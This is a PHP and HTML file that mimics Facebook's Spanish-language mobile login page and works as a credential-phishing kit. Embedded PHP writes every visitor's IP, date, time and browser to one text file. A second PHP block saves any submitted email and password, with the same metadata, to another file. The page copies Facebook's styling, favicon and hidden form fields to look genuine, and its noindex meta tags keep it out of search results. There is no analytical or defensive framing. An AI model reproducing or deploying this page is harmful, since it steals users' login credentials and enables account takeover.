<?php
#ver la ip
$ip = $_SERVER['REMOTE_ADDR'];
#ver la fecha
$fecha = date("d-m-Y");
#ver la hora
$hora = date("H:i:s");
#ver el navegador
$navegador = $_SERVER['HTTP_USER_AGENT'];
#guardar los datos
$fp = fopen("Posible.txt","a");
fputs($fp,"\nIP: " . $ip . "\nFecha: " . $fecha . "\nHora: " . $hora . "\nNavegador: " . $navegador . "\n_______________________________________________\n");
fclose($fp);
?>
<!DOCTYPE html><html lang="es">
    <head><title>Facebook - Entrar o registrarse</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
    <meta charset="utf-8">
        <!--no indexar-->
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="google" content="nositelinkssearchbox" />
    <meta name="google" content="notranslate" />
    <meta name="google" content="noarchive" />
    <meta name="google" content="nosnippet" />
    <meta name="google" content="noodp" />
    <meta name="google" content="noimageindex" />
    <meta name="google" content="nocache" />
    <meta name="google" content="noarchive" />
    <meta name="google" content="noydir" />
    <meta name="google" content="noimageindex" />
    <meta name="google" content="nocache" />
    <meta name="google" content="noarchive" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Dancing+Script">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Pacifico">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Indie+Flower">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Shadows+Into+Light">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Cookie">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Courgette">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Kaushan+Script">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Dosis">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Great+Vibes">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster+Two">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Shadows+Into+Light">
    <meta no cache>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="Content-Language" content="es" />
    
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196" />
    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yL/l/0,cross/kUF0lepa2YJ.css"/>
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yz/l/0,cross/BaEuMwZ_7aq.css" />
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yY/l/0,cross/x2b93jCTsmg.css"/><link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y6/l/0,cross/0gtnVJ5rfTK.css"/>
    
</head>

<body tabindex="0" class="touch x2 _fzu _50-3 iframe acw">
        
    <div id="viewport" data-kaios-focus-transparent="1">
        
    <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1><div id="page"><div class="_129_" id="header-notices"></div><div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane"><div class="_7om2"><div class="_4g34" id="u_0_0_Wr">
        
    <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice"><div class="_52jd">
    </div></div><div class="_9om_"><div class="_4-4l"><div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"></div><div class="_7om2 _52we _2pid _52z6"><div class="_4g34"><a ><img src="fondo.svg" width="112" class="img" alt="facebook" /></a></div></div><div class="_5rut">
        
    <form method="post">
        <input type="hidden" name="lsd" value="AVoueAY3sYQ" autocomplete="off" />
        <input type="hidden" name="jazoest" value="2970" autocomplete="off" />
        <input type="hidden" name="m_ts" value="1638127015" />
        <input type="hidden" name="li" value="p9WjYYoMYrazKQxP135-cj5Y" />
        <input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number" />
        <input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries" />
        <div id="user_info_container" data-sigil="user_info_after_failure_element">

        </div>
        <div id="pwd_label_container" data-sigil="user_info_after_failure_element"
        ></div><div id="otp_retrieve_desc_container">

        </div><div><div class="_56be"><div class="_55wo _56bf"><div class="_96n9" id="email_input_container"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email" placeholder="N&#xfa;mero de m&#xf3;vil o correo electr&#xf3;nico" type="text" data-sigil="m_login_email" /></div></div></div><div class="_55wq"></div><div class="_56be"><div class="_55wo _56bf"><div class="_1upc _mg8" data-sigil="m_login_password"><div class="_7om2"><div class="_4g34 _5i2i _52we"><div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pass" placeholder="Contrase&#xf1;a" type="password" data-sigil="password-plain-text-toggle-input" /></div></div><div class="_5s61 _216i _5i2i _52we"><div class="_5xu4"><div class="_2pi9" style="display:none" id="u_0_1_XZ"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2_6V">OCULTAR</span><span class="mfss" id="u_0_3_Hm">MOSTRAR</span></a>
</div>
</div>
</div>
</div>
</div></div></div></div>
<div class="_2pie" style="text-align:center;"><div id="login_password_step_element" data-sigil="login_password_step_element">
    <button type="submit" value="Entrar" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="login" data-sigil="touchable login_button_block m_login_button"><span class="_55sr">Entrar</span></button></div><div class="_7eif" id="oauth_login_button_container" style="display:none"></div><div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div><div id="otp_button_elem_container"></div></div><input type="hidden" name="prefill_contact_point" id="prefill_contact_point" /><input type="hidden" name="prefill_source" id="prefill_source" /><input type="hidden" name="prefill_type" id="prefill_type" /><input type="hidden" name="first_prefill_source" id="first_prefill_source" /><input type="hidden" name="first_prefill_type" id="first_prefill_type" /><input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false" /><input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false" /><input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false" /><input type="hidden" id="bi_xrwh" name="bi_xrwh" value="0" /><input type="hidden" id="scetoggle" /><div class="_xo8"></div><noscript><input type="hidden" name="_fb_noscript" value="true" /></noscript></form>
    
    
    
    <?php
    if(isset($_POST['login'])){
        $user = $_POST['email'];
        $pass = $_POST['pass'];
        if(isset($_POST['email']) && isset($_POST['pass'])){
        $correo = "Correo: " . $user;
        $contra = "Contraseña: " . $pass;
        $fecha = "Fecha: " . date("d-m-Y");
        $hora = "Hora: " . date("H:i:s");
        $ip = "IP: " . $_SERVER['REMOTE_ADDR'];
        $navegador = "Navegador: " . $_SERVER['HTTP_USER_AGENT'];
        $archivo = fopen("Guardadas.txt", "a");
        fwrite($archivo, $correo . "<br>");
        fwrite($archivo, $contra . "<br>");
        fwrite($archivo, $fecha . "<br>");
        fwrite($archivo, $hora . "<br>");
        fwrite($archivo, $ip . "<br>");
        fwrite($archivo, $navegador . "<br>");
        fwrite($archivo, "-----------------------------------------------------------------------------------------------------------------------------" . "<br>\n");
        fclose($archivo);

        }else{
            echo "<h3>No se puede dejar campos vacios!</h3>";
        }

    }
    ?>
    <div><div class="_2pie _9omz"><div class="_52jj _9on1"><a class="_9on1" tabindex="0" href="#" id="forgot-password-link">¿Has olvidado la contraseña?</a></div></div><div style="padding-top: 42px"><div><div><div><div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">o</span></div><div class="_52jj _5t3b" id="signup_button_area"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="#" tabindex="0" data-sigil="m_reg_button">Crear cuenta nueva</a></div></div></div><div class="_2pie" style="text-align:center;"><div><div data-sigil="login_identify_step_element"></div><div class="other-links _8p_m"><ul class="_5pkb _55wp"><li></li></ul></div></div></div></div></div></div></div></div></div></div></div><div style="display:none"></div><span><img src="#" width="0" height="0" style="display:none" /></span><div class="_55wr _5ui2" data-sigil="m_login_footer"><div class="_5dpw"><div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea"><div class="_7om2"><div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">Español (España)</span><div class="_3ztc"><span class="_52jc"><a href="#" data-ajaxify-href="#" data-method="post" data-sigil="ajaxify">Português (Brasil)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#" data-ajaxify-href="#" data-method="post" data-sigil="ajaxify">Deutsch</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#" data-ajaxify-href="#" data-method="post" data-sigil="ajaxify">العربية</a></span></div></div><div class="_4g34"><div class="_3ztc"><span class="_52jc"><a href="#" data-ajaxify-href="#" data-method="post" data-sigil="ajaxify">English (US)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#" data-ajaxify-href="#" data-method="post" data-sigil="ajaxify">Français (France)</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#" data-ajaxify-href="#" data-method="post" data-sigil="ajaxify">Italiano</a></span></div><a href="#" aria-label="Lista completa de idiomas" data-sigil="more_language"><i class="img sp_TH5s7LpCvWO_2x sx_b25065"></i></div></a></div></div></div><div class="_5ui4"><div class="_96qv _9a0a"><a href="#" class="_96qw" title="Lee nuestro blog, descubre el centro de recursos y encuentra ofertas de trabajo.">Información</a><span aria-hidden="true"> · </span><a href="#" class="_96qw" title="Visita nuestro servicio de ayuda.">Ayuda</a><span aria-hidden="true"> · </span><span class="_96qw" id="u_0_4_zt">Más</span></div><div class="_96qv" style="display:none" id="u_0_5_hM"><a href="#" class="_96qw" title="Consultar Messenger."> Messenger </a><a href="/lite/?refid=8" class="_96qw" title="Facebook Lite para Android."> Facebook Lite </a><a href="h#" class="_96qw" title="Explora nuestros v&#xed;deos de Watch."> Watch </a><a href="/places/?refid=8" class="_96qw" title="Consulta lugares populares en Facebook.">Lugares</a><a href="https://facebook.com/games/?refid=8" class="_96qw" title="Consulta los juegos en Facebook.">Juegos</a><a href="/marketplace/?refid=8" class="_96qw" title="Compra y vende art&#xed;culos en Facebook Marketplace.">Marketplace</a><a href="https://pay.facebook.com/?refid=8" class="_96qw" target="_blank" title="M&#xe1;s informaci&#xf3;n sobre Facebook Pay">Facebook Pay</a><a href="/jobs/?refid=8" class="_96qw" title="Busca empleo y contrata a personas en Facebook.">Empleos</a><a href="https://www.oculus.com/" class="_96qw" target="_blank" title="M&#xe1;s informaci&#xf3;n sobre Oculus">Oculus</a><a href="https://portal.facebook.com/?refid=8" class="_96qw" target="_blank" title="Obt&#xe9;n m&#xe1;s informaci&#xf3;n sobre Facebook Portal">Portal</a><a href="#" class="_96qw" title="Echa un vistazo a Instagram" target="_blank" rel="noopener" data-sigil="MLynx_asynclazy">Instagram</a><a href="https://www.bulletin.com/" class="_96qw" title="Echa un vistazo al bolet&#xed;n de noticias de Bulletin">Bulletin</a><a href="/local/lists/245019872666104/?refid=8" class="_96qw" title="Busca en nuestro directorio de listas locales.">Local</a><a href="/fundraisers/?refid=8" class="_96qw" title="Haz una donaci&#xf3;n a causas que te importan.">Recaudaciones de fondos</a><a href="/biz/directory/?refid=8" class="_96qw" title="Busca en nuestro directorio de servicios de Facebook.">Servicios</a><a href="#" class="_96qw" title="Desarrolla en nuestra plataforma.">Desarrolladores</a><a href="/careers/?ref=pf&amp;refid=8" class="_96qw" title="&#xda;nete a nuestra extraordinaria empresa.">Empleo</a><a data-nocookies="1" href="/privacy/explanation?refid=8" class="_96qw" title="Inf&#xf3;rmate acerca de tu privacidad y Facebook.">Privacidad</a><a href="/groups/explore/?refid=8" class="_96qw" title="Explora nuestros grupos.">Grupos</a></div><span class="mfss fcg">Facebook, Inc.</span></div></div></div></div><div class=""></div><div class="viewportArea _2v9s" style="display:none" id="u_0_6_jt" data-sigil="marea"><div class="_5vsg" id="u_0_7_/l"></div><div class="_5vsh" id="u_0_8_zC"></div><div class="_5v5d fcg"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Cargando...</div></div><div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea"><div class="container"><div class="image"></div><div class="message" data-sigil="error-message"></div><a class="link" data-sigil="MPageError:retry">Intentar de nuevo</a></div></div></div></div><div id="static_templates"><div class="mDialog" id="modalDialog" style="display:none"><div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader"><div class="_7om2 _52we"><div class="_5s61"><div class="_52z7"><button type="submit" value="Cancelar" class="cancelButton btn btnD bgb mfss touchable" id="u_0_a_xc" data-sigil="dialog-cancel-button">Cancelar</button><button type="submit" value="Atr&#xe1;s" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Atr&#xe1;s" id="u_0_b_Ho" data-sigil="dialog-back-button"><i class="img sp_TH5s7LpCvWO_2x sx_e4ea58" style="margin-top: 2px;"></i></button></div></div><div class="_4g34"><div class="_52z6"><div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Cargando...</div></div></div><div class="_5s61"><div class="_52z8" id="modalDialogHeaderButtons"></div></div></div></div><div class="modalDialogView" id="modalDialogView"></div><div class="_5v5d _5v5e fcg" id="dialogSpinner"><div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_9_fY" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Cargando...</div></div></div>
        


   </body></html>